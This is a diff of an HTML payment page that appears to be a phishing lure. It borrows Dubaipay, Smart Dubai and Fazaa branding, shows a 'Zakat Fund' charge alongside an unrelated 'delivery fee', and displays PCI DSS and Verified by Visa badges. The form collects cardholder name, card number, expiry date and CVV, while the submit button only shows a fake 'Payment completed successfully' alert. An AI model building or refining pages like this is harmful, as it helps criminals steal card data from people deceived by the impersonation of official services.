@@ -6,198 +6,160 @@
     <title>Payment - Fazaa Initiative</title>
     <style>
         * {
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
         }
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            height: 100vh;
-            margin: 0;
-            padding: 0;
-            overflow: hidden;
+            background-color: #f5f5f5;
+            padding: 20px;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
-        }
-
-        .language-switcher {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            z-index: 1000;
-        }
-
-        .language-switcher button {
-            background-color: #d4af37;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 14px;
-        }
-
-        .language-switcher button:hover {
-            background-color: #c9a027;
         }
 
         .container {
-            width: 100%;
-            height: 100vh;
-            margin: 0;
+            max-width: 600px;
+            margin: 0 auto;
             background: white;
-            border-radius: 0;
-            box-shadow: none;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
             display: flex;
             flex-direction: column;
+            min-height: 100vh;
         }
 
-        header {
-            background-color: white;
-            padding: 15px 20px;
+        .header {
+            background: linear-gradient(135deg, #1e3a8a 0%, #0f766e 100%);
+            padding: 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 2px solid #e0e0e0;
-            flex-shrink: 0;
+            color: white;
         }
 
-        .dubai-digital-logo {
-            height: 45px;
+        .header-left {
+            display: flex;
+            gap: 15px;
+            align-items: center;
         }
 
-        main {
-            padding: 40px;
-            flex: 1;
-            overflow-y: auto;
-            max-width: 600px;
-            margin: 0 auto;
-            width: 100%;
-            min-height: 0;
+        .header-logo {
+            height: 40px;
+            width: auto;
+        }
+
+        .header-right {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .lang-btn {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+
+        .lang-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
         }
 
         .progress-steps {
             display: flex;
-            justify-content: space-between;
-            margin-bottom: 40px;
-            align-items: center;
+            justify-content: space-around;
+            padding: 20px;
+            background: #f9fafb;
+            border-bottom: 1px solid #e5e7eb;
         }
 
         .step {
-            flex: 1;
-            text-align: center;
-            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
         }
 
         .step-number {
             width: 40px;
             height: 40px;
             border-radius: 50%;
-            background-color: #e0e0e0;
-            color: #666;
+            background: #e5e7eb;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 10px;
             font-weight: bold;
+            color: #6b7280;
+            font-size: 18px;
         }
 
         .step.active .step-number {
-            background-color: #667eea;
+            background: #3b82f6;
             color: white;
         }
 
         .step.completed .step-number {
-            background-color: #4caf50;
+            background: #10b981;
             color: white;
         }
 
         .step-label {
             font-size: 12px;
-            color: #666;
-        }
-
-        .step.active .step-label {
-            color: #667eea;
-            font-weight: bold;
-        }
-
-        .step-connector {
-            position: absolute;
-            top: 20px;
-            left: -50%;
-            width: 100%;
-            height: 2px;
-            background-color: #e0e0e0;
-            z-index: -1;
-        }
-
-        .step.completed .step-connector {
-            background-color: #4caf50;
-        }
-
-        .step:last-child .step-connector {
-            display: none;
-        }
-
-        .fees-section {
-            background-color: #f8f9fa;
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 30px;
-            border-left: 4px solid #667eea;
-        }
-
-        .fees-title {
-            font-size: 18px;
-            color: #1a1a1a;
-            margin-bottom: 15px;
-            font-weight: 600;
-        }
-
-        .fees-content {
-            font-size: 14px;
-            color: #333;
-            line-height: 1.6;
-        }
-
-        .fees-note {
-            background-color: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 12px;
-            margin-top: 12px;
-            border-radius: 4px;
-            font-size: 13px;
-            color: #333;
-        }
-
-        .card-logos-display {
+            color: #6b7280;
             text-align: center;
+        }
+
+        .content {
+            padding: 30px;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .section {
             margin-bottom: 30px;
-        }
-
-        .card-logos-display img {
-            max-width: 100%;
-            height: auto;
-            max-height: 150px;
-        }
-
-        .payment-section {
-            background-color: white;
-            padding: 25px;
-            border-radius: 8px;
-            border: 1px solid #e0e0e0;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
         }
 
         .section-title {
-            font-size: 20px;
-            color: #1a1a1a;
-            margin-bottom: 25px;
+            font-size: 16px;
             font-weight: 600;
+            color: #1f2937;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #e5e7eb;
+        }
+
+        .transaction-info {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            background: #f9fafb;
+            padding: 15px;
+            border-radius: 8px;
+        }
+
+        .info-row {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .info-label {
+            font-size: 13px;
+            color: #6b7280;
+        }
+
+        .info-value {
+            font-size: 15px;
+            font-weight: 600;
+            color: #1f2937;
         }
 
         .form-group {
@@ -206,35 +168,35 @@
 
         label {
             display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-weight: 500;
             font-size: 14px;
+            font-weight: 500;
+            color: #1f2937;
+            margin-bottom: 8px;
         }
 
         input, select {
             width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #e0e0e0;
+            padding: 12px;
+            border: 1px solid #d1d5db;
             border-radius: 6px;
             font-size: 14px;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            transition: all 0.3s ease;
+            font-family: inherit;
+            transition: all 0.3s;
         }
 
         input:focus, select:focus {
             outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
         }
 
         input.error {
-            border-color: #f44336;
-            background-color: #ffebee;
+            border-color: #ef4444;
+            background-color: #fef2f2;
         }
 
         .error-message {
-            color: #f44336;
+            color: #ef4444;
             font-size: 12px;
             margin-top: 5px;
             display: none;
@@ -244,182 +206,234 @@
             display: block;
         }
 
-        .card-number-wrapper {
-            position: relative;
-        }
-
-        .card-type-icon {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 40px;
-            height: 25px;
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
-        }
-
-        input#cardNumber {
-            padding-right: 60px;
-        }
-
         .date-row {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 15px;
+            gap: 10px;
         }
 
-        .button-group {
+        .cvv-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            align-items: flex-end;
+        }
+
+        .cvv-info {
+            font-size: 12px;
+            color: #6b7280;
+            line-height: 1.4;
+            grid-column: 1 / -1;
+        }
+
+        .card-logos {
             display: flex;
+            justify-content: center;
             gap: 15px;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #e5e7eb;
+            flex-wrap: wrap;
+        }
+
+        .card-logo {
+            height: 35px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            height: 30px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
             margin-top: 30px;
         }
 
-        button {
-            flex: 1;
-            padding: 14px;
+        .btn {
+            padding: 12px 20px;
             border: none;
             border-radius: 6px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: all 0.3s;
         }
 
-        .submit-btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        .btn-primary {
+            background: linear-gradient(135deg, #0f766e 0%, #0d9488 100%);
             color: white;
         }
 
-        .submit-btn:hover {
+        .btn-primary:hover {
             transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
+            box-shadow: 0 4px 12px rgba(15, 118, 110, 0.3);
         }
 
-        .submit-btn:active {
-            transform: translateY(0);
+        .btn-secondary {
+            background: #e5e7eb;
+            color: #1f2937;
         }
 
-        .back-btn {
-            background-color: #f0f0f0;
-            color: #333;
-            border: 1px solid #ddd;
+        .btn-secondary:hover {
+            background: #d1d5db;
         }
 
-        .back-btn:hover {
-            background-color: #e8e8e8;
-        }
-
-        footer {
-            background-color: #1a3a52;
-            color: white;
+        .footer {
+            background: #1f2937;
+            color: #9ca3af;
             padding: 20px;
             text-align: center;
             font-size: 12px;
+            line-height: 1.6;
             flex-shrink: 0;
         }
 
-        footer a {
-            color: #d4af37;
+        .footer a {
+            color: #3b82f6;
             text-decoration: none;
-            margin: 0 10px;
         }
 
-        footer a:hover {
+        .footer a:hover {
             text-decoration: underline;
         }
 
+        .accepted-cards-img {
+            max-width: 100%;
+            height: auto;
+            margin: 20px 0;
+        }
+
         @media (max-width: 600px) {
-            main {
+            .content {
                 padding: 20px;
             }
 
-            .payment-section {
-                padding: 15px;
-            }
-
-            .date-row {
+            .transaction-info {
                 grid-template-columns: 1fr;
             }
 
-            .button-group {
+            .buttons {
+                grid-template-columns: 1fr;
+            }
+
+            .header {
                 flex-direction: column;
+                gap: 10px;
+            }
+
+            .progress-steps {
+                gap: 10px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="language-switcher">
-        <button onclick="switchLanguage()">العربية</button>
-    </div>
-
     <div class="container">
-        <header>
-            <img src="/dubai_digital_logo.png" alt="Dubai Digital" class="dubai-digital-logo">
-            <div></div>
-        </header>
+        <!-- Header -->
+        <div class="header">
+            <div class="header-left">
+                <img src="/dubaipay.png" alt="Dubaipay" class="header-logo">
+                <img src="/smart_dubai.png" alt="Smart Dubai" class="header-logo">
+            </div>
+            <div class="header-right">
+                <button class="lang-btn" onclick="switchLanguage()">العربية</button>
+            </div>
+        </div>
 
-        <main>
-            <!-- Progress Steps -->
-            <div class="progress-steps">
-                <div class="step completed">
-                    <div class="step-number">✓</div>
-                    <div class="step-label">Information</div>
-                    <div class="step-connector"></div>
-                </div>
-                <div class="step completed">
-                    <div class="step-number">✓</div>
-                    <div class="step-label">Confirmation</div>
-                    <div class="step-connector"></div>
-                </div>
-                <div class="step active">
-                    <div class="step-number">3</div>
-                    <div class="step-label">Payment</div>
+        <!-- Progress Steps -->
+        <div class="progress-steps">
+            <div class="step completed">
+                <div class="step-number">✓</div>
+                <div class="step-label">Data</div>
+            </div>
+            <div class="step completed">
+                <div class="step-number">✓</div>
+                <div class="step-label">Confirmation</div>
+            </div>
+            <div class="step active">
+                <div class="step-number">3</div>
+                <div class="step-label">Payment</div>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="content">
+            <!-- Transaction Information -->
+            <div class="section">
+                <div class="section-title">Transaction Information</div>
+                <div class="transaction-info">
+                    <div class="info-row">
+                        <span class="info-label">Service Provider</span>
+                        <span class="info-value">Zakat Fund</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Service</span>
+                        <span class="info-value">Zakat DD</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Transaction No.</span>
+                        <span class="info-value">1322640</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Amount</span>
+                        <span class="info-value">100.00 AED</span>
+                    </div>
                 </div>
             </div>
 
             <!-- Fees Section -->
-            <div class="fees-section">
-                <h2 class="fees-title">Delivery Fees</h2>
-                <div class="fees-content">
-                    <p>A delivery fee of 5 AED will be charged upon order approval.</p>
-                    <div class="fees-note">
-                        <strong>Note:</strong> In case of rejection of your order, no fees will be charged to you.
-                    </div>
+            <div class="section">
+                <div class="section-title">Delivery Fees</div>
+                <p style="font-size: 14px; color: #4b5563; margin-bottom: 10px;">
+                    An amount of 5 AED will be charged upon approval of your order.
+                </p>
+                <div style="background: #fef3c7; border-left: 4px solid #f59e0b; padding: 12px; border-radius: 4px; font-size: 13px; color: #92400e;">
+                    <strong>Note:</strong> In case of non-approval of your order, no charges will be deducted from you.
                 </div>
             </div>
 
-            <!-- Accepted Cards Display -->
-            <div class="card-logos-display">
-                <img src="/accepted_cards_en.jpg" alt="Accepted Cards">
+            <!-- Accepted Cards Image -->
+            <div class="section" style="text-align: center;">
+                <img src="/accepted_cards_en.jpg" alt="Accepted Cards" class="accepted-cards-img">
             </div>
 
-            <!-- Payment Form -->
-            <div class="payment-section">
-                <h2 class="section-title">Card Information</h2>
+            <!-- Card Details -->
+            <div class="section">
+                <div class="section-title">Card Details</div>
 
                 <div class="form-group">
                     <label for="cardholderName">Cardholder Name</label>
-                    <input type="text" id="cardholderName" placeholder="Enter cardholder name" maxlength="50">
-                    <div class="error-message"></div>
+                    <input type="text" id="cardholderName" placeholder="Enter cardholder name" 
+                           oninput="validateCardholderName(this)">
+                    <div class="error-message" id="cardholderNameError"></div>
                 </div>
 
                 <div class="form-group">
                     <label for="cardNumber">Card Number</label>
-                    <div class="card-number-wrapper">
-                        <div class="card-type-icon"></div>
-                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
-                    </div>
-                    <div class="error-message"></div>
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" 
+                           maxlength="19" oninput="formatAndValidateCardNumber(this)">
+                    <div class="error-message" id="cardNumberError"></div>
                 </div>
 
                 <div class="form-group">
                     <label>Expiry Date</label>
                     <div class="date-row">
                         <div>
-                            <label for="expiryMonth" style="font-size: 12px; margin-bottom: 5px;">Month</label>
-                            <select id="expiryMonth">
+                            <select id="expiryMonth" onchange="validateExpiry()">
                                 <option value="">Select Month</option>
                                 <option value="01">January (01)</option>
                                 <option value="02">February (02)</option>
@@ -434,109 +448,129 @@
                                 <option value="11">November (11)</option>
                                 <option value="12">December (12)</option>
                             </select>
-                            <div class="error-message"></div>
+                            <div class="error-message" id="expiryError"></div>
                         </div>
                         <div>
-                            <label for="expiryYear" style="font-size: 12px; margin-bottom: 5px;">Year</label>
-                            <select id="expiryYear">
+                            <select id="expiryYear" onchange="validateExpiry()">
                                 <option value="">Select Year</option>
+                                <option value="2026">2026</option>
+                                <option value="2027">2027</option>
+                                <option value="2028">2028</option>
+                                <option value="2029">2029</option>
+                                <option value="2030">2030</option>
+                                <option value="2031">2031</option>
+                                <option value="2032">2032</option>
+                                <option value="2033">2033</option>
+                                <option value="2034">2034</option>
+                                <option value="2035">2035</option>
+                                <option value="2036">2036</option>
+                                <option value="2037">2037</option>
+                                <option value="2038">2038</option>
+                                <option value="2039">2039</option>
+                                <option value="2040">2040</option>
+                                <option value="2041">2041</option>
+                                <option value="2042">2042</option>
+                                <option value="2043">2043</option>
+                                <option value="2044">2044</option>
+                                <option value="2045">2045</option>
                             </select>
-                            <div class="error-message"></div>
                         </div>
                     </div>
                 </div>
 
                 <div class="form-group">
                     <label for="cvv">Security Code (CVV)</label>
-                    <input type="text" id="cvv" placeholder="123" maxlength="4">
-                    <div class="error-message"></div>
+                    <div class="cvv-row">
+                        <input type="text" id="cvv" placeholder="123" maxlength="4" 
+                               oninput="validateCVV(this)">
+                        <img src="/card_logos.png" alt="CVV" style="height: 40px; width: auto;">
+                    </div>
+                    <div class="error-message" id="cvvError"></div>
+                    <div class="cvv-info">
+                        The CVV (Security Code) is the last three digits of the number found on the back of your credit card near the signature strip.
+                    </div>
                 </div>
 
-                <div class="button-group">
-                    <button class="submit-btn" onclick="submitPayment()">Complete Payment</button>
-                    <button class="back-btn" onclick="goBack()">Back</button>
+                <!-- Card Logos -->
+                <div class="card-logos">
+                    <img src="/card_logos.png" alt="Visa" class="card-logo">
+                    <img src="/payment_methods.png" alt="Payment Methods" class="card-logo">
+                </div>
+
+                <!-- Security Badges -->
+                <div class="security-badges">
+                    <img src="/pci_dss.png" alt="PCI DSS" class="badge">
+                    <img src="/verified_visa.gif" alt="Verified by VISA" class="badge">
+                    <img src="/safekey.gif" alt="SafeKey" class="badge">
+                    <img src="/iso_certified.gif" alt="ISO Certified" class="badge">
                 </div>
             </div>
-        </main>
 
-        <footer>
-            <p>This website is operated and managed by Fazaa Initiative to support the UAE family.</p>
-            <p>
-                <a href="/privacy">Privacy Policy</a> |
-                <a href="/terms">Terms and Conditions</a>
-            </p>
-            <p>© 2026 All rights reserved for Fazaa UAE.</p>
-        </footer>
+            <!-- Buttons -->
+            <div class="buttons">
+                <button class="btn btn-secondary" onclick="goBack()">Back</button>
+                <button class="btn btn-primary" onclick="completePayment()">Complete Payment</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>This website is operated and managed by the Fazaa Initiative to support the UAE family.</p>
+        <p style="margin-top: 10px;">
+            <a href="/privacy">Privacy Policy</a> | <a href="/terms">Terms and Conditions</a>
+        </p>
+        <p style="margin-top: 10px;">© 2026 All rights reserved to Fazaa UAE.</p>
     </div>
 
     <script>
-        // Initialize year dropdown
-        function initializeYears() {
-            const currentYear = new Date().getFullYear();
-            const yearSelect = document.getElementById('expiryYear');
-            for (let i = 0; i < 20; i++) {
-                const year = currentYear + i;
-                const option = document.createElement('option');
-                option.value = year.toString().slice(-2);
-                option.textContent = year;
-                yearSelect.appendChild(option);
+        function validateCardholderName(input) {
+            const arabicEnglishRegex = /^[a-zA-Z\u0600-\u06FF\s]*$/;
+            const error = document.getElementById('cardholderNameError');
+            
+            if (input.value && !arabicEnglishRegex.test(input.value)) {
+                input.classList.add('error');
+                error.textContent = 'Name must contain letters only';
+                error.classList.add('show');
+            } else {
+                input.classList.remove('error');
+                error.classList.remove('show');
             }
         }
 
-        // Card number validation and formatting
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\s/g, '');
-            let formattedValue = '';
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) {
-                    formattedValue += ' ';
-                }
-                formattedValue += value[i];
-            }
-            e.target.value = formattedValue;
+        function formatAndValidateCardNumber(input) {
+            let value = input.value.replace(/\s/g, '');
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+            input.value = formatted;
 
-            // Detect card type
-            detectCardType(value);
-
-            // Validate card number
+            const error = document.getElementById('cardNumberError');
             if (value.length === 16) {
-                validateCardNumber(value);
-            }
-        });
-
-        function detectCardType(cardNumber) {
-            const icon = document.querySelector('.card-type-icon');
-            if (cardNumber.startsWith('4')) {
-                icon.style.backgroundImage = 'url("data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 48 32%22%3E%3Crect fill=%22%231434CB%22 width=%2248%22 height=%2232%22 rx=%224%22/%3E%3Ctext x=%2224%22 y=%2220%22 font-size=%2214%22 fill=%22white%22 text-anchor=%22middle%22 font-weight=%22bold%22%3EVISA%3C/text%3E%3C/svg%3E")';
-            } else if (cardNumber.startsWith('5')) {
-                icon.style.backgroundImage = 'url("data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 48 32%22%3E%3Crect fill=%22%23EB001B%22 width=%2224%22 height=%2232%22 rx=%224%22/%3E%3Crect fill=%22%23F79E1B%22 x=%2224%22 width=%2224%22 height=%2232%22 rx=%224%22/%3E%3Ctext x=%2224%22 y=%2220%22 font-size=%2210%22 fill=%22white%22 text-anchor=%22middle%22 font-weight=%22bold%22%3EMC%3C/text%3E%3C/svg%3E")';
+                if (luhnCheck(value)) {
+                    input.classList.remove('error');
+                    error.classList.remove('show');
+                } else {
+                    input.classList.add('error');
+                    error.textContent = 'Invalid card, do not use';
+                    error.classList.add('show');
+                }
+            } else if (value.length > 0) {
+                input.classList.add('error');
+                error.textContent = 'Card number must be 16 digits';
+                error.classList.add('show');
             } else {
-                icon.style.backgroundImage = 'none';
+                input.classList.remove('error');
+                error.classList.remove('show');
             }
         }
 
-        function validateCardNumber(cardNumber) {
-            const errorDiv = document.querySelector('#cardNumber').nextElementSibling;
-            if (luhnCheck(cardNumber)) {
-                document.getElementById('cardNumber').classList.remove('error');
-                errorDiv.classList.remove('show');
-            } else {
-                document.getElementById('cardNumber').classList.add('error');
-                errorDiv.textContent = 'Invalid card, do not use';
-                errorDiv.classList.add('show');
-            }
-        }
-
-        function luhnCheck(cardNumber) {
+        function luhnCheck(num) {
             let sum = 0;
             let isEven = false;
-            for (let i = cardNumber.length - 1; i >= 0; i--) {
-                let digit = parseInt(cardNumber[i], 10);
+            for (let i = num.length - 1; i >= 0; i--) {
+                let digit = parseInt(num[i], 10);
                 if (isEven) {
                     digit *= 2;
-                    if (digit > 9) {
-                        digit -= 9;
-                    }
+                    if (digit > 9) digit -= 9;
                 }
                 sum += digit;
                 isEven = !isEven;
@@ -544,35 +578,52 @@
             return sum % 10 === 0;
         }
 
-        // Cardholder name validation (letters only)
-        document.getElementById('cardholderName').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
-        });
+        function validateExpiry() {
+            const month = document.getElementById('expiryMonth').value;
+            const year = document.getElementById('expiryYear').value;
+            const error = document.getElementById('expiryError');
 
-        // CVV validation
-        document.getElementById('cvv').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/[^0-9]/g, '');
-        });
-
-        // Submit payment
-        function submitPayment() {
-            alert('Payment information submitted successfully!');
+            if (month && year) {
+                const currentDate = new Date();
+                const expiryDate = new Date(year, month - 1);
+                if (expiryDate < currentDate) {
+                    error.textContent = 'Card expired';
+                    error.classList.add('show');
+                } else {
+                    error.classList.remove('show');
+                }
+            }
         }
 
-        // Go back
+        function validateCVV(input) {
+            const cvv = input.value;
+            const error = document.getElementById('cvvError');
+            
+            if (cvv.length > 0 && !/^\d+$/.test(cvv)) {
+                input.classList.add('error');
+                error.textContent = 'CVV must contain numbers only';
+                error.classList.add('show');
+            } else if (cvv.length > 0 && (cvv.length < 3 || cvv.length > 4)) {
+                input.classList.add('error');
+                error.textContent = 'Invalid CVV';
+                error.classList.add('show');
+            } else {
+                input.classList.remove('error');
+                error.classList.remove('show');
+            }
+        }
+
+        function completePayment() {
+            alert('Payment completed successfully!');
+        }
+
         function goBack() {
-            window.location.href = '/confirmation.html';
+            window.history.back();
         }
 
-        // Switch language
         function switchLanguage() {
             window.location.href = '/payment_ar.html';
         }
-
-        // Initialize on page load
-        window.addEventListener('DOMContentLoaded', function() {
-            initializeYears();
-        });
     </script>
 </body>
 </html>
